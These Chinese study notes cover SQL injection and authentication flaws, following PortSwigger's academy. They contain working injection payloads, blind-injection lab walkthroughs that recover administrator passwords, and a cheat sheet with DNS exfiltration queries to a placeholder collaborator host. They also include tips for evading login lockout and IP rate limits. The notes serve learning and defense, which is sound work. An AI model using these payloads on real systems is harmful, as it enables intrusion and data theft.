> 根据portswigger网站的推荐学习顺序，学习网络安全漏洞

![image-20220113221638178](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221638178.png)

![image-20220113221650975](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221650975.png)

![image-20220113221700751](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220113221700751.png)

![image-20220113221708824](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221708824.png)

# SQL 注入

> SQL injection is an old-but-gold vulnerability responsible for many high-profile data breaches. Although relatively simple to learn, it can potentially be used for some high-severity exploits. This makes it an ideal first topic for beginners, and essential knowledge even for more experienced users.
>
> SQL注入是一个老而弥坚的漏洞，对许多高知名度的数据泄露事件负有责任。虽然学习起来相对简单，但它有可能被用于一些高风险的漏洞。这使得它成为初学者理想的第一个主题，甚至对更有经验的用户来说也是必不可少的知识。

![image-20220114161003494](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114161003494.png)

SQL注入漏洞允许攻击者干扰应用程序对其数据库的查询。它通常允许攻击者查看通常不能检索的数据，包括其他用户的数据或数据库相关信息。在许多情况下，攻击者可以修改或删除这些数据，导致网站应用程序内容或行为发生==持久性变化==。

在某些情况下，攻击者可以损害底层服务器或其它后端设施或进行拒绝服务攻击。

## 造成SQL注入漏洞的主要原因

前端的数据传入到后端处理时，没有做严格的判断，导致其传输的代码拼接到SQL语句中，被当做SQL语句的一部分执行。

## SQL注入的种类

- 数字型注入
- 字符型注入
- 搜索型注入
- xx型注入
- insert/update注入
- delete注入
- http header注入
- 盲注 base on boolean
- 盲注 base on time
- 宽字节注入

也可以分为

- 修改一个SQL查询返回额外的结果
- 改变SQL查询语句干扰网站应用程序逻辑
- UNION拼接检索不同数据库和表信息
- 数据库的版本和结构的信息
- 盲注，即查询的结果不应在网站返回的响应中

## 详解

### 1.修改一个SQL查询返回额外的结果

有一个购物网站以不同的种类展示商品，当用户点击商品时，浏览器的URL是

```
https://insecure-website.com/products?category=Gifts
```

这个会调用后端一个SQL语句从数据库中查询信息。

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

这个SQL语句会向数据库中products表请求所有类别是Gifts类别和released列值为1的所有商品信息。

如果网站没有任何针对SQL注入攻击的防御措施，可以构建一个如下语句

```
https://insecure-website.com/products?category=Gifts'--
```

当前端传回至后端执行SQL语句时，

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

--在数据库中被用于注释后面所有内容，这有效的删除了后端构造SQL语句的其余部分，所以可以将released列的限制去除。

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

上面的URL被传入后端的SQL语句是

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

### 2.改变SQL查询语句干扰网站应用程序逻辑

用户登录界面时，用户通过用户名和密码登陆。以下是可能的SQL语句

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

在已知用户名的情况下，可以通过注释将密码查询注释掉。即

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

该行为可直接作为管理员用户登陆。

### ==3.UNION拼接检索不同数据库信息==

在网站应用程序返回SQL语句结果时，可以利用SQL注入从数据库中获取其他信息。

使用UNION联合查询执行额外的SELECT语句

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

执行UNION语句

```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
```

查询到了user表中的username和password

#### 要求

- 每个查询必须返回相同数量的列
- 每列中的数据类型必须在各个查询之间兼容

通常需要在构造语句前了解

- 原始查询返回了多少列
- 原始查询的哪些列可以保存注入查询的结果

#### UNION使用说明

1. 确定SQL注入UNION攻击所需的列数

   - 使用ORDER BY语句递增，直至发生错误。

     ```mysql
     ' ORDER BY 1--
     ```

     这个有效载荷改变了原始查询语句，以结果集中不同列对结果排序查询。当指定列的索引超过结果集中的实际列数时，数据库将返回错误。

   - 提交一系列有效载荷，指定不同数量的NULL。

     ```sql
     ' UNION SELECT NULL--
     ' UNION SELECT NULL,NULL--
     ' UNION SELECT NULL,NULL,NULL--
     ```

     当NULL与列数不匹配时，数据库将返回错误。

   - ==注意==

     - 使用NULL作为注入SELECT查询的返回值是因为，每列的数据类型必须在原始查询和注入查询之间兼容。NULL可以转换为任意数据类型，当列数正确时，使用NULL可以最大限度提高有效载荷的成功率

     - Oracle上每个SELECT查询都必须使用FROM关键字并指定一个有效的表。在Oracle中有个dual内置表。故查询语句为

       ```sql
       ' union select null from dual--
       ```

     - 在Mysql中--后必须有空格，或直接使用#注释

2. 在SQL注入中通过UNION查找有用数据类型列
   首先需要用

   ```sql
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   ```

   确定返回列数。随后通过使用所需类型替换NULL进行测试。
   如

   ```sql
   ' UNION SELECT 'a',NULL,NULL,NULL--
   ' UNION SELECT NULL,'a',NULL,NULL--
   ' UNION SELECT NULL,NULL,'a',NULL--
   ' UNION SELECT NULL,NULL,NULL,'a'--
   ```

   若不兼容，可能返回HTTP错误或数据库查询错误。

   ```sql
   Conversion failed when converting the varchar value 'a' to data type int.
   ```

   若未发生错误则包含一些附加内容（包括注入的字符串）。

3. 通过SQL注入查询特定数据
   当确定了原始SQL语句查询返回的列数和类型时，可以检索特定表中的符合类型的内容

4. 检查单个列中的多个值
   当想查询信息和列数不匹配时，使用字符串串联的格式将两个值连接在一起。

5. | Oracle     | `'foo'||'bar'`                                               |
   | :--------- | ------------------------------------------------------------ |
   | Microsoft  | `'foo'+'bar'`                                                |
   | PostgreSQL | `'foo'||'bar'`                                               |
   | MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |

### 4.查看数据库信息

在确定SQL注入存在时，获取数据库信息是目标之一，便于后续操作。

#### 可以查询版本信息

| Oracle     | `SELECT banner FROM v$version       SELECT version FROM v$instance` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

还可以确定存在哪些数据库表，以及包含那些列。在大多数数据库中可以执行

```sql
SELECT * FROM information_schema.tables
```

#### 获取数据库的列和表信息

| Oracle     | `SELECT * FROM all_tables         SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT * FROM information_schema.tables        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables         SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables         SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

#### 列出数据库内容

除Oracle数据库，都有一组成为information schema的视图，用于提供数据库信息。

```sql
SELECT * FROM information_schema.tables
```

返回如下所示的输出

![image-20220114225259872](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114225259872.png)

表示有三个表，同时可以查询各列信息

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

![image-20220114225404909](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114225404909.png)返回表中的各列及类型

### 5.盲注

SQL盲注是指应用程序容易受到SQL注入的攻击，但HTTP响应不包含相关SQL查询结果或任何数据信息。

对于盲注，许多注入技巧失效（如UNION)。

#### 通过触发条件响应使用SQL盲注

当网站应用程序交互使用Cookie时，

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

当处理包含Cookie的请求时，应用程序会使用SQL语句查询是否存在用户

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

此时可能存在SQL注入，查询的结果不会返回给用户，但网站的响应可能存在不同。

可以使用类似注入语句

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

假设存在一个username和password的username表，可以构造为

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

这时注入条件是True，将返回正确内容。

语句内容为从Users表中Password字段中选取Username为Administrator对应内容的第一个字符与m的ASCII码做对比。

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

可以使用==SUBSTRING==猜解每一位的密码，如下

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| :--------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

##### 例子1

https://ac8c1f671fff8a06c0f30b8600d50046.web-security-academy.net/filter?category=Gifts开启代理后抓包

![image-20220115113423526](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113423526.png)

发送到Repeater利用cookie作为关键字构造

```sql
'and '1'='1
```

![image-20220115113608605](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113608605.png)

正常显示Welcome Back

```sql
'and '1'='2
```

![image-20220115113733602](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113733602.png)

不能正常回显，判断此处存在注入漏洞。

构造函数确定存在Users表

```sql
'AND (SELECT 'a' FROM Users LIMIT 1)='a
```

![image-20220115114301096](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114301096.png)

```sql
'AND (SELECT 'a' FROM Users WHERE Username='administrator')='a
```

![image-20220115114533652](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114533652.png)

下一步猜解密码长度,使用Intruder自动化测试

Payload类型设置为Number，从1起始至25猜解

![image-20220115115000603](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115000603.png)

```sql
'AND (SELECT 'a' FROM Users WHERE Username='administrator' AND LENGTH(Password)=1)='a
```

![image-20220115114848641](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114848641.png)

密码长度为20

继续猜解每一位密码

![image-20220115115743501](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115743501.png)

```sql
'AND (SELECT SUBSTRING (Password,1,1) FROM Users WHERE Username='administrator')='a
```

![image-20220115115512942](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115512942.png)

依次猜解结果为：pt51g0yboco1bg8utmzm

![image-20220115120641861](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115120641861.png)

#### 通过触发SQL错误引发响应

当网站执行构造的SQL语句时，并未返回不同的网站响应。可以通过有条件的出发SQL错误来诱导返回条件响应。 

通常会对SQL查询语句进行修改，以便条件为真时导致数据库错误，一般是Error Message。

假设发送了两个请求

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

第一个语句因为判断1=2时为False所以跳转至ELSE

第二个语句1=1判断为True则发生了1/0的除零错误，用此差异判断注入语句条件。

如：

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

##### 条件错误

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

##### 例子2

得知数据库是Oracle，当语句为

```sql
' AND (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a
```

显示错误

![image-20220115124615557](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115124615557.png)

当语句为

```sql
' AND (SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a
```

正常显示，故存在SQL注入漏洞

![image-20220115124720986](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115124720986.png)

同样的使用Intruder猜解

![image-20220115125844632](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115125844632.png)

密码长度为20

![image-20220115130716332](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115130716332.png)

密码为：1p5msfyngan9bgvrb6gw

![image-20220115132409662](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115132409662.png)

## SQL注入检测方法

- 基于报错的检查方法
  使用各种符号及组合，如单引号'，双引号"，括号(和百分号%
- 基于布尔的检测
  最常用的' and '1'='1和' and '1'='2等同于' and '1'和'and '0'，判断寻找网站应用程序响应（返回结果）的不同

## 二阶注入

![image-20220115143703554](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115143703554.png)

二阶是利用存储在数据库中的合法内容，追加构造SQL查询语句达到SQL注入攻击的目的。

> 通过构造特殊的输入内容传给服务端或数据库达到欺骗服务器执行恶意的SQL命令。因为其利用方式比较独特，需要提前在数据库中插入已经构造好的内容，并利用已有内容进行语句组合提交，方可成功利用，所以称其为二次注入或二阶注入。

### 思路

> 转载于[**https://www.secpulse.com/archives/76506.html**](https://www.secpulse.com/archives/76506.html)

1. 数据库存储未转义，大多来说，存储到数据库中的东西只是做了表面的转义，实质上库里存储的还是原始状态的内容，在多数读取未校验的情况下，可输入特殊字符并在页面上完整显示的部分，有可能存在二次注入的可能。

2. 强交互部分，SQL注入是需要与数据库联动的，但往往在登录、修改内容、发布内容等功能上忽略了历史数据这一点，所以在遇到有修改账户密码、发布留言、发布内容的部分，大家不妨去试试注册一个test或者admin’--或者admin账号，然后在测试回复的内容或者修改的内容是否达到预期。如果与预期不符，那么有可能就存在二次注入，此时在精心构造sql语句即可。

3. 防御绕过，有些地方明显存在异常，但是又做了一些限制，比如年龄，限制了字段为is_numeric，那么我们可以通过转换进制，16进制等方式将其录入，查询时的效果是一样的，遇到其他的限制，跟xss绕过原理一样，大家可以脑洞大开，搞一些数据库可以解析的编码进去。

4. 多录入异常内容，多观察返回结果，凡是与自己录入的内容不一致的地方，就可以去看看是否存在二次注入。

## ==如何防止SQL注入==

1. 所有查询语句使用参数化查询接口
2. 过滤危险SQL语句关键字
3. 严格规定数据长度
4. 网站数据层编码同一
5. 严格限制网站用户的数据库操作权限
6. 避免网站显示SQL错误

通常使用预编译和变量绑定

### 预编译

采用PreparedStatement将SQL语句预先编译

```
SQL引擎先语法分析、产生语法树、生成执行计划
```

使用?作为占位符，填入具体参数setXX作为具体数值执行

```php
String sql="select id,no from user where id=?";
PreparedStatement ps = conn.prepareStatement(sql);
prestmt.setInt(1,id);
prestmt.executeQuery();
```

### 变量绑定

使用变量代替常量，减少解析次数。

## SQL注入小抄

### 字符串连接

| Oracle     | `'foo'||'bar'`                                               |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |

### 字符串提取

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| :--------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### 截断查询

| Oracle     | `--comment`                                                  |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `--comment/*comment*/`                                       |
| PostgreSQL | `--comment/*comment*/`                                       |
| MySQL      | `#comment` `-- comment` [Note the space after the double dash] `/*comment*/` |

### 数据库版本

| Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

### 数据库内容

| Oracle     | `SELECT * FROM all_tables       SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT * FROM information_schema.tables        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### 条件判断

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### 批处理或堆栈查询

| Oracle     | `Does not support batched queries.` |
| :--------- | ----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

使用MySQL，批处理查询通常不能用于SQL注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库进行通信，则偶尔会发生这种情况。

### 时延

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| :--------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

### 条件判断时延

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`               |

### DNS解析

| Oracle     | The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
| MySQL      | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |

### 数据泄露的DNS查找

| Oracle     | `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')` |
| PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
| MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |

# Authentication vulnerabilities 认证漏洞

![image-20220115183814400](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115183814400.png)

认证是验证一个特定用户或客户身份的过程。

认证因素可以归结为：

1. 用户知道的内容：密码或安全问题的答案
2. 用户拥有的内容：手机或安全令牌之类的实物
3. 用户的行为方式：生物行为模式

认证机制依靠一系列技术验证因素中的一个或多个。

### 认证和授权的区别

认证是验证一个用户是不是所声明身份的过程，授权验证是验证一个用户是不是具有执行某项行为的权利。

### 认证漏洞的产生原因

1. 认证机制并不完善，不能完全阻止暴力破解的发生。
2. 失效的身份验证，认证实现中逻辑缺陷或错误编码验证会导致攻击者使用技巧绕过登陆。

### 认证漏洞的影响

攻击者绕过认证或暴力破解后，可以访问被攻击账户的所有数据和功能。如果用户权限很高，就可以获取对网站的控制权，同时可以访问内部设施。低权限的用户可能造成信息泄露或提供了利用其他漏洞的可能。

## 详解

### 密码登陆中的漏洞

#### 暴力破解

暴力破解指的是攻击者通过不断登陆，利用系统提供的错误显示信息，猜解用户的正确信息。

暴力破解可以分为完全猜解和不完全猜解。当攻击者对猜解信息毫无头绪时，通常使用巨大的密码字典进行暴力破解。通常情况下，攻击者可以利用一些基本的密码逻辑和收集到的用户信息，做出有一定依据的猜解。

##### 暴力破解用户名

用户名容易被猜解是因为可视化较高，甚至可以猜测到。

可以检查是否能在不登录情况下访问用户档案，或HTTP响应中是否有被泄露。

##### 暴力破解密码

密码破解的难度随密码的复杂程度有所不同，通常的网站会采取一定形式规范用户密码的设置（比如，规定最少密码位数、大小写和特殊字符）。

我们可以根据猜解用户行为方式使得暴力破解过程更便捷，比如通常不会使用随机字符组合方式创建密码。

### 用户名枚举

攻击者通过观察网站响应内容猜解用户名，通常发生在登录页面上。

在暴力破解时，应该注意以下的网站响应差异：

1. ==状态码==
   在暴力破解的猜解过程中，返回的HTTP状态码中，如果猜解返回的状态码是不同的，表明用户名可能是正确的。
   ==最佳解决方案是：网站始终返回相同的状态代码==
   ![image-20220115195522534](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115195522534.png)
2. 错误信息
   取决于用户名和密码的正确与否，返回的错误信息可能不同。
3. 响应时间
   当大多数请求都有相似的响应时间，有些请求响应与之不同，可能在后端发生了一些问题，是猜解正确的一种迹象。
   - ==注意事项==：当利用响应时间作为判断依据时
     ![image-20220115213935297](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115213935297.png)
     在Burp中需要打开Response received和Response completed作为值比较。同时，username或password猜解的另一方需为较大的==字符值==（至少大于100)，才能分辨出存在的用户名。

### 有缺陷的防护措施

暴力破解必定涉及很多错误的猜解，防止暴力破解最常见的两种常见方法是：

1. 如果失败次数过多，锁定远程访问用户的权限
2. 如果IP地址进行过多的远程登陆尝试，阻止IP地址的访问
   待解决问题：
   ![image-20220116003327432](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116003327432.png)
   在Burpsuite的Intruder模块爆破时，理论上通过一个正确混搭一个猜解的方式可以绕过同IP多次暴力破解导致被封时间。但通过测试，在随机一定范围内会正常进行，之后就会被判断为同IP多次登陆失败。
   ==已解决==：
   通过利用Resource Pool并发数配置，在两个请求间人为的设置一个间隔时间，使得服务器响应彻底返回即可。

### 账户锁定相关

当满足某些可疑条件（如一定数量的登录失败）时锁定账户。服务器指示账户已锁定时，用户名可以被枚举猜解出来。

#### 绕过账户锁定保护的技巧

1. 构建一个足够小的密码字典，以达成不超过限制登陆次数
2. 使用凭证登陆。由一个网站数据泄露的凭证，攻击者使用一个凭证可能登陆很多使用同样凭证方式的网站。

### 用户限流

在短时间内尝试登陆请求次数过多，网站可能将IP地址限制登陆。

通常可以通过以下方式解封：

1. 管理员手动操作
2. 用户完成验证后解封

用户限流通常比锁定账户更有效，通常情况下避免了用户名猜解和DDOS攻击。

#### 例子

请求如下

![image-20220116021813790](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021813790.png)

在Repeater构造如下请求即可

![image-20220116021724828](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021724828.png)

返回302登录成功

![image-20220116021901587](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021901587.png)

右键点击Show response in Browser

![image-20220116021944246](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021944246.png)

成功利用漏洞

## HTTP基本认证

在HTTP认证中，客户端从服务器收到一个token。token由用户名和密码连接而成，并用Base64编码进行加密。这个token由浏览器存储和管理，浏览器会自动加入后续请求的认证内。如

```
Authorization: Basic base64(username:password)
```

但这并不安全，每次请求中不断重复发送用户的token，除非网站实现了HSTS，否则可以被中间人攻击截获。

其次，用户的token是完全静态的，很容易被暴力破解。

同时，被CSRF跨站请求伪造攻击。
